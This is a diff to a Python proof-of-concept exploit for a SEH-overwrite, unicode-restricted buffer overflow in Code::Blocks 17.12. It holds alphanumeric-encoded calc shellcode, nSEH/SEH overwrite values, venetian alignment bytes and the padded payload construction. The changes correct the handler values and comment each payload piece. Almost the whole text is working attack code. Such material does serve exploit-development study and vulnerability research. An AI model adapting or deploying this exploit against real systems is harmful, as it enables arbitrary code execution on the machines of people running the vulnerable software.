@@ -1,4 +1,4 @@
-from struct import *
+#!/usr/bin/python
 
 """
 1. overwrite SEH handler, observe vulnerability and unicode resictions
@@ -51,32 +51,31 @@ shellcode_calc += "K1HO4KQXSC6TKLLPKTKQHMLM1J3TKLD4KM1XP3YQ4O4ND1KQK31PYPZB1KOYP
 shellcode_calc += "4KN2JKDMQMQZM1DM3U7BKPM0KP0PS8P1TKBOE7KOZ57KKNLNNRIZ1XUV65WMEMKOJ5O"
 shellcode_calc += "LM6SLLJE0KK9PCEKUWKOWMCSBRO2JKPR3KO9ERC1QRL1SNN1U3H35M0AA"
 
-nseh = "\xe0\x50"
-seh = "\x61\x62"
+nseh = "\x61\x62" # POPAD
+seh = "\xE0\x50"  # POP POP RET sequence from codeblocks.exe
 
 venterian_alignment = (
-"\x53" 					#push ebx
-"\x47" 					#align
-"\x58" 					#pop eax
-"\x47"
-"\x47"          #align
-"\x05\x28\x11" 	                        
-"\x47"					#align
-"\x2d\x13\x11"	#sub eax,300
-"\x47"					#align
-"\x50"					#push eax
-"\x47"					#align
-"\xc3"					#retn
+"\x53" 					                            #push ebx
+"\x47" 					                            #align
+"\x58" 					                            #pop eax
+"\x47"                                  #align
+"\x05\x28\x11" 	                         
+"\x47"					                             #align
+"\x2d\x13\x11"	                         #sub eax,300
+"\x47"					                             #align
+"\x50"					                             #push eax
+"\x47"					                             #align
+"\xc3"					                             #retn
 )
 
 payload  = "A" * 1982
-payload += nseh
-payload += seh
-payload += "\x47" * 10
-payload += venterian_alignment
-payload += "\x47" * 16
-payload += shellcode_calc
-payload += "D" * 8000
+payload += nseh                         # POPAD
+payload += seh                          # POP POP RET
+payload += "\x47" * 10                  # padding
+payload += venterian_alignment          # venterian alignment exploit
+payload += "\x47" * 28                  # padding
+payload += shellcode_calc               # calc payload with alphamixed encoder
+payload += "D" * 10000
 
 try:
     print("[x] Exploit POC for Codeblocks 17.12 SEH unicode\n")
